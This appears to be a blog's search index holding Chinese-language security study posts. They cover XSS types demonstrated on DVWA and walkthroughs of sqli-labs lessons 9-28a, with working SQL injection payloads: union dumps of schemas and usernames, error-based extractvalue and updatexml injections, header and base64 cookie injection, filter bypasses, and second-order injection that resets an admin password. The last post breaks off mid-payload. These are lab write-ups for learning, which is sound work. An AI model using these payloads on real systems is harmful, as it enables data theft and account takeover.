<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss跨站脚本分类</title>
    <link href="/2020/08/05/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB/"/>
    <url>/2020/08/05/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS跨站脚本分类"><a href="#XSS跨站脚本分类" class="headerlink" title="XSS跨站脚本分类"></a>XSS跨站脚本分类</h2><h3 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a><strong>xss介绍</strong></h3><blockquote><ul><li>跨站脚本攻击 (Cross Site Scripting) 为了不和层叠样式表(Cascading Style Sheets CSS)的缩写混淆，故交跨站脚本攻击缩写为XSS，而已攻击者往Web页面里插入恶意script代码，当用户浏览该页知识，嵌入其中Web里面的script代码会被执行，从而达到而已攻击用户的目的</li></ul></blockquote><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h3><blockquote><ul><li><p>攻击者通过邮件等形式将包含XSS代码的连接发送给正常用户，当用户点击时，服务器接收该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞</p></li><li><p>例如</p><ul><li><?php echo$_GET("uname")?>  </li><li>当用户访问url?<code>uname=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>时，触发代码，弹出对话框</li></ul></li><li><p>以dvwa为例</p><ul><li>弹出自定义内容</li></ul><table><thead><tr><th align="center"><code>&lt;scrip&gt;alert(&#39;hello&#39;) &lt;/script?&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201538.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>弹出当前网页cookie</li></ul><table><thead><tr><th align="center"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201642.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul></blockquote><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h3><blockquote><ul><li><p>存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性</p><ul><li>攻击者在论坛，博客，留言板中，发帖的过程嵌入XSS代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发XSS代码</li></ul></li><li><p>案例</p><ul><li>点击提交就会不断的弹出弹框</li></ul><table><thead><tr><th align="center"><code>&lt;script&gt;alert(&quot;this is test&quot;)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201759.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul></blockquote><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a><strong>DOM型XSS</strong></h3><blockquote><ul><li>全称Document Object Model,使用DOM动态访问更新文档的内容，结构及样式</li></ul><table><thead><tr><th align="center">DOM结构图</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201915.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>HTML标签都是节点，节点组成了节点树。通过HTML DOM可以树上的所有结点进行修改</li><li>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码，触发XSS漏洞。</li><li>案例</li></ul><table><thead><tr><th align="center">在url default中输入值可以插入到网页中</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201951.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>&lt;script&gt;alert(&quot;hello world&quot;)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826202029.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center">发现代码已经嵌入网页内</td></tr></tbody></table></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>xss本应叫css的，但为了不和层叠样式表重名，特意叫成xss</li><li>反射型xss，由服务端发送到浏览器，最后浏览器解析恶意代码。</li><li>存储型xss，和反射型的区别在于，存储型xss将恶意代码存储到了服务器中，能够持久化攻击</li><li>dom型xss，不同于前两者，dom型xss是基础dom文档对象模型的一种漏洞</li></ul>]]></content>
    
    
    <categories>
      
      <category>xss-challenges</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss跨站脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less23-28a</title>
    <link href="/2020/08/04/sqli-less23-less28a/"/>
    <url>/2020/08/04/sqli-less23-less28a/</url>
    
    <content type="html"><![CDATA[<h1 id="less23-less28a"><a href="#less23-less28a" class="headerlink" title="less23 -  less28a"></a>less23 -  less28a</h1><h3 id="less-23"><a href="#less-23" class="headerlink" title="less 23"></a>less 23</h3><ul><li>less23 在sql语句进行查询前，对id参数进行了<code>#,--</code>注释符号过滤。</li><li>直接上payload</li></ul><table><thead><tr><th align="center"><a href="http://192.168.5.139/Less-23/?id=-1&#39;union" target="_blank" rel="noopener">http://192.168.5.139/Less-23/?id=-1&#39;union</a> select 1,database(),’3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825001321.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>解释一下为什么payload这么构造</li></ul><pre><code class="hljs sql">此处的sql语句为<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'-1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),%<span class="hljs-number">273</span>两个知识点：<span class="hljs-number">1.</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> 之所以<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>，是因为<span class="hljs-keyword">sql</span>语句执行了两个<span class="hljs-keyword">select</span>语句，第一个<span class="hljs-keyword">select</span>为<span class="hljs-keyword">id</span>的选择语句，第二个为自己构造的<span class="hljs-keyword">select</span>语句。只有一个数据可以输出，所以需要第一个<span class="hljs-keyword">select</span>没有结果。<span class="hljs-number">2.</span> <span class="hljs-number">-1</span><span class="hljs-string">' union select 1,select database(),'</span><span class="hljs-number">3</span> 第一个单引号用于闭合<span class="hljs-number">-1</span>,第二个单引号闭合后面的单引号，这样查询内容即可显示在username处</code></pre><ul><li>还可以用报错注入，延迟注入， 可以or ‘1’ = ‘1进行闭合。</li><li>这里好像有点问题，截断数据包后，如果payload全是明文的话，直接报语法错误了，最好经过url编码转换一下</li></ul><table><thead><tr><th align="center">%27or%20extractvalue(1,concat(0x7e,database()))%20or%20%271%27=%27</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825002645.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>查询数据库，payload也是同上，部分符号需要转换成url编码</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(schema_name)from%20information_schema.schemata),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003223.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>获取security库的数据表</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003409.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>查询users表的所有列</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003536.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>获取users表的内容</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(username)%20from%20security.users%20limit%200,1),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003833.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h2><ul><li><p>如果这关登录成功后，没有进行修改密码的操作的话，可能是因为logged-in.php文件的问题，重新下载解压，解压过程中选择覆盖即可。</p></li><li><p>less24为二次注入，二次注入也是存储型注入。要解释的话，那就是将可能导致sql注入的字符插入到数据库中，当调用这个恶意字符时，就可以出发sql注入。</p></li><li><p>二次注入流程：</p></li></ul><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 客户端构造数据，通过浏览器提交http数据报文请求到服务端进行处理，报文中存在sql语句或命令<span class="hljs-number">2.</span> 服务端将客户端提交的信息进行存储<span class="hljs-number">3.</span> 客户端向服务端发送和第一个请求不一样的http数据报文<span class="hljs-number">4.</span> 服务端收到客户端的请求后，处理该请求，查询第一次请求的数据，导致客户端第一次请求中构造的sql语句或命令触发<span class="hljs-number">5.</span> 客户端返回服务端的执行结果，客户端可以通过返回信息判断二次注入是否触发</code></pre><ul><li><p>demo</p><table><thead><tr><th align="center">原始数据为</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015138.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">注册admin’#账号</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015230.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">数据库中出现了admin‘# 用户的数据，同时密码为111，且admini用户的密码为123456</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015348.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">登录admin’# 修改密码</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015453.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>可以看到修改的是admin’# 用户的密码，但实际却是admin用户，因为sql语句变为了<code>update users set passwd=&quot;new_passwd&quot; where username = &#39;admin&#39;#</code>，导致了二次注入，从而修改了admin用户的密码</li></ul></li></ul><h2 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h2><ul><li>less25主要为 <code>and or</code>字符过滤，几个常用的绕过思路</li></ul><pre><code class="hljs sql">大小写绕过 Or,OR,oR双写绕锅 oorr编码绕过 hex,urlencode内联注释 <span class="hljs-comment">/*or*/</span>利用符号绕过 or=&amp;&amp; or = ||暂时想到这些后续有的话会补充</code></pre><ul><li>这里使用的是利用符号绕过</li><li>demo，<ul><li>这里有个坑就是，不知道为什么在burp重放中，如果空格和单引号不是url编码的话，提交后返回的结果是报错的</li><li>最好将部分符号进行urlencode</li></ul></li></ul><table><thead><tr><th align="center">%27%20||extractvalue(1,concat(0x7e,(select version()),0x7e))%20–+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825020634.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h2><ul><li>同上一关比较，less25a对id没有进行<code>&#39;&#39;</code>包含，同时没有输出报错信息，所以直接pass掉报错注入</li><li>其余没区别，这里使用联合注入.</li></ul><table><thead><tr><th align="center">%20union%20select%201,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825021320.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h2><ul><li><p>如果这关在windows系统下，无法使用特殊字符代替空格的话，这个锅由apache来背。将平台更换到linux下就解决了。</p></li><li><p>本关在less25的基础上，对常用的关键字及符号<code>or,and,/*,#,--</code>等符号进行过滤。对绕过and及or的方法参考less25，这里不再赘述。</p></li><li><p>注释和结尾字符，只能构造一个<code>&#39;</code>来闭合后面的<code>&#39;</code>, 空格的方法就比较多了</p></li></ul><pre><code class="hljs sql">%09 tab键(水平制表键)%0a 新建一行%0c 新建一页%0d return功能%0b tab键(垂直制表键)%a0 空格</code></pre><ul><li>payload/sql语句及解释</li></ul><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where id =<span class="hljs-string">'$id'</span>  limit 0,1给一个简单的payload?<span class="hljs-attribute">id</span>=-1'%a0||'1提交的sql语句为 select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=<span class="hljs-string">'-1'</span> || <span class="hljs-string">'1'</span> limit 0,1 第一个<span class="hljs-string">'闭合id='</span><span class="hljs-variable">$id</span><span class="hljs-string">'的单引号，%0a为空格。（此处环境为unbunt14.04.1+apache+mysql_php，可以解析%0a。之前使用windows+wamp测试是无法解析%0a的）</span></code></pre><table><thead><tr><th align="center"><a href="http://192.168.5.139/Less-26/?id=-1%27%a0" target="_blank" rel="noopener">http://192.168.5.139/Less-26/?id=-1%27%a0</a></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825022712.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>后续的注入，可以参考前面的关卡来进行更改sql语句。这里不进行一一操作。</li></ul><h2 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h2><ul><li><p>这关和less26的区别在于，sql语句的处理上多了一个(),同时抛出错误后不在前排输出。pass掉报错注入后，依旧可以用联合注入</p></li><li><p>与less26 一致，用<code>&#39;)</code>闭合前面的<code>&#39;</code>，接着跟上构造的payload，最后利用<code>(&#39;1</code>进行彼闭合</p></li></ul><table><thead><tr><th align="center">?id=-1000%27)union%a0select%a01,user(),(%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825023551.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>可以将user()替换成想要的sql语句，同时也可以进行延迟注入，参考前文。</li></ul><h2 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h2><ul><li>在上一关的基础上，增加了对<code>union,select</code>的关键字过滤。依旧可以使用less26的方式，只不过需要对union和select进行大小写混合</li></ul><table><thead><tr><th align="center">?id=-234%27UniOn%a0sElECt%a01,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825024316.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>也可以用双写uniunionon进行绕过(经测试双写select好像不行)，亦可用报错注入或延迟注入。</li></ul><table><thead><tr><th align="center">?id=-234%27uniunionon%a0SeLect%a01,database(),3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825024659.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h2><ul><li>和上一关的区别是对于id的处理，这里用的是”$id”,同时mysql错误不会在前端显示。</li><li>根据上一关，给出一个demo payload</li></ul><table><thead><tr><th align="center">?id=100%%22%a0UnIon%a0SElecT%a01,user(),%223</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825025706.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h2><ul><li>本关和less27基本一致，不过对id的处理变成了（’$id’）</li><li>直接给出payload</li></ul><table><thead><tr><th align="center">?id=100%27)unIon%0BsElect%0B1,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825030126.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h2><ul><li>同上一关一致，只是少了几个过滤条件。</li></ul><table><thead><tr><th align="center">?id=100%27)unIon%0bsElect%0b1,version(),3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825030349.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>需要消化的几个知识点</strong></p><ul><li>二次注入的流程及利用</li><li>能够替换空格的常见符号<ul><li>%09 tab键(水平制表键)</li><li>%0a 新建一行</li><li>%0c 新建一页</li><li>%0d return功能</li><li>%0b tab键(垂直制表键)</li><li>%a0 空格</li></ul></li><li>常见字符及关键字的绕过<ul><li>大小写绕过</li><li>双写绕过</li><li>编码绕过</li><li>内联注释绕过</li><li>利用符号绕过</li></ul></li><li>还有一点就是sqli平台的记录，暂时到此为止。需要伸展一下其他方面的技能树才行，后续有时间的话会补上。</li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less17-22</title>
    <link href="/2020/08/03/sqli-less17-23/"/>
    <url>/2020/08/03/sqli-less17-23/</url>
    
    <content type="html"><![CDATA[<h1 id="less17-less22"><a href="#less17-less22" class="headerlink" title="less17 - less22"></a>less17 - less22</h1><h3 id="mysql函数介绍"><a href="#mysql函数介绍" class="headerlink" title="mysql函数介绍"></a>mysql函数介绍</h3><ul><li>在前面的sql注入中经常用到的语句就是增删改查了，前面都是查，在这里把增删改补上。</li></ul><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><ul><li><p>insert 该函数用于增加数据</p><ul><li>增加一行数据</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">values</span>(<span class="hljs-string">"字段对应的值"</span>)<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">values</span>(<span class="hljs-string">"16"</span>,<span class="hljs-string">"daming"</span>,<span class="hljs-string">"man"</span>)</code></pre></li></ul><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><ul><li><p>删除结构</p><ul><li>删除数据库<code>drop dabase db_name</code></li><li>删除表<code>drop table table_name</code></li></ul></li><li><p>删除数据</p><ul><li><code>delete from 表名;</code></li><li><code>delete from 表名 where id=1;</code></li></ul><pre><code class="hljs sql"><span class="hljs-comment"># demo</span>delect from  users where id=16;</code></pre></li></ul><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><ul><li>修改所有: <code>update table_name set column_name = &quot;new_value;&quot;</code> </li><li>带条件的修改<code>update table_name set column_name = &quot;new_value&quot;where id=6</code></li></ul><pre><code class="hljs mysql"># demoupdate users set username&#x3D;&quot;test&quot; where id&#x3D;&quot;15&quot;</code></pre><h2 id="三个新函数"><a href="#三个新函数" class="headerlink" title="三个新函数"></a>三个新函数</h2><ul><li><p>addslashes() 在预定义字符前添加反斜杠</p><ul><li>预定义字符为：</li></ul><pre><code class="hljs sql">单引号 (')双引号 (")反斜杠 (\)NULL</code></pre><ul><li><p>该函数可用于需要存存储到数据库中的字符串及数据库查询语句字符串</p></li><li><p>需要注意一点：默认情况下，php对所有的<code>GET,POST 和COOKIE数据</code>自动使用addslashes()，所以不应该对已经转义过的字符串再次使用addslashes，再次使用会导致双层转义。碰到这种情况可以使用get_magic_quotes_gpc()进行检测。</p></li><li><p>语法：</p><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">string</td><td align="center">必需，规定要转义的字符串</td></tr><tr><td align="center">返回值</td><td align="center">返回以转义的字符串</td></tr><tr><td align="center">php版本</td><td align="center">4+</td></tr></tbody></table></li></ul></li><li><p>stripslashes()  该函数用于删除addlashes()函数添加的反斜杠</p></li><li><p>mysql_real_escape_string() 转义sql语句中使用的字符串中的特殊字符</p><ul><li>以下字符受影响</li></ul><pre><code class="hljs sql">\x00\n\r\'"\x1a</code></pre><ul><li><p>函数执行成功，则返回被转义的字符串，失败则返回false</p></li><li><p>语法</p><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">string</td><td align="center">必须，要转义的字符</td></tr><tr><td align="center">connection</td><td align="center">可选，规定mysql连接。如果没规定，则使用上一个连接</td></tr></tbody></table></li><li><p>本行函数将string中的特殊字符进行转义。</p></li></ul></li></ul><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><ul><li>从less17的首页可以看到，本关是一个修改密码过程，利用的是update语句。同利用select语句一致，需要将id的引号闭合触发报错。</li><li>输入恶意语句报错，admin后多出了两个<code>&#39;&#39;</code>说明对密码处理使用了<code>&#39;&#39;</code>。</li></ul><table><thead><tr><th align="center">You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ‘admin’’ at  line 1</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821200723.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>利用盲注进行注入</p><ul><li>报错型盲注，这里uname的值需要是一个已存在的用户。</li></ul><table><thead><tr><th align="center">uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select version()),0x7e)) –+ &amp;submit=Submit</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821202053.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>这里为什么不对username进行注入，瞟一眼源代码就知道了</li></ul><table><thead><tr><th align="center">check_input()函数使用mysql_real_escape_strintg()对username进行了各种转义处理</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821205048.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>更多的payload参考less5</p></li></ul><h2 id="HTTP头介绍"><a href="#HTTP头介绍" class="headerlink" title="HTTP头介绍"></a>HTTP头介绍</h2><ul><li>详细介绍，可以看这篇文章。<code>https://blog.csdn.net/sinat_34166518/article/details/83584910</code></li></ul><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><ul><li><p>这关不能再对username及passwd进行注入了</p><table><thead><tr><th align="center">从源代码可以看到使用了check_input()函数对用户名及密码进行了检测</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821211921.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>但是呢，从下面insert语句中将useragent和ip插入到了数据库中</p><table><thead><tr><th align="center">$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;            mysql_query($insert);</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821213658.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><p>通过修改user-agent来进行注入</p><ul><li>提交数据，账号密码随便输入</li></ul><table><thead><tr><th align="center">使用burpsuite进行截断修改user-agent</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824205928.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>将user-agent修改成payload</li></ul><table><thead><tr><th align="center">‘ and extractvalue(caocat(0x7e,(select version()),0x7e)) and ‘1’ = ‘1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824210625.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><ul><li>从源代码可以看出，less19同样是保存用户的http头部信息。那和上一关基本一致，不过可以换成refere进行注入。</li><li>将referer修改成payload</li></ul><table><thead><tr><th align="center">‘ and updatexml(1,concat(0x7e,(select @@basedir),0x7e),3) and ‘1’ = ‘1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824211339.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>提交后可以看到输出了mysql的路径，其他payload都可以尝试，这里不列举。</li></ul><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><ul><li>同样从源代码中得知，当cookie从username中获取到值后，会进行查询。也就是说注入点从user-agent或referer变成了cookie。</li><li>尝试进行报错注入，将cookie修改成payload。提交数据后，会发送两个数据包，这里要截断的是带有cookie的数据包</li></ul><table><thead><tr><th align="center">admin ‘  and updatexml(1,(concat(0x7e,(select database()),0x7e)),3) –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824212600.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h3 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h3><ul><li>less21 与less20 的区别在于对cookie进行了base64转换，这里需要将payload进行base64转换</li><li>还有就是对uname进行了(‘uname’)处理。</li></ul><pre><code class="hljs sql">原payload：admin1')and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@basedir),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span>进行了base64转换后的payload：YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSAj</code></pre><table><thead><tr><th align="center">进行base64转换的时候可以利用burp中的decoder模块</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824213429.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><ul><li>less22和less20-21差不多相似，从源代码可以看出对uname进行了 “uname”处理，所以构造payload时要将单引号变成双引号再进行base64编码转换。</li></ul><pre><code class="hljs sql">原payload：admin" and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span>base64payload：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</code></pre><table><thead><tr><th align="center">将转码成base64后的payload修改到cookie处提交</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824214714.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>接触了新知识点，需要重点关注。</li><li>mysql增删改</li><li>http头部信息</li><li>burpsuite decoder功能</li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less9-16</title>
    <link href="/2020/08/02/sqli-less9-16/"/>
    <url>/2020/08/02/sqli-less9-16/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less9-16"><a href="#sqli-less9-16" class="headerlink" title="sqli-less9-16"></a>sqli-less9-16</h1><ul><li>less8 是一个布尔盲注，和less5没什么区别，略过。</li></ul><h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><ul><li><p>从标题得知，less9<code>&lt;基于时间-单引号&gt;</code>,那这关明显是延迟注入了。</p></li><li><p>闭合前一个单引号，构造的延迟注入语句。(延迟注入不贴图了，记录一下payload)</p><pre><code class="hljs mysql"># 数据库http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;?id&#x3D;1%27 and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep()) --+ #判断数据库的第一位字符ascii是否为115，也就是字母shttp:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+ # 判断数据库名第二个字符ascii是否为101，也就是e通过多次替换substr()的第二个参数以及if的成立条件的到数据库名security</code></pre><pre><code class="hljs mysql"># 查询security数据库里的数据表http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and If (ascii(substr((select table_name frominformation_schema.tables where 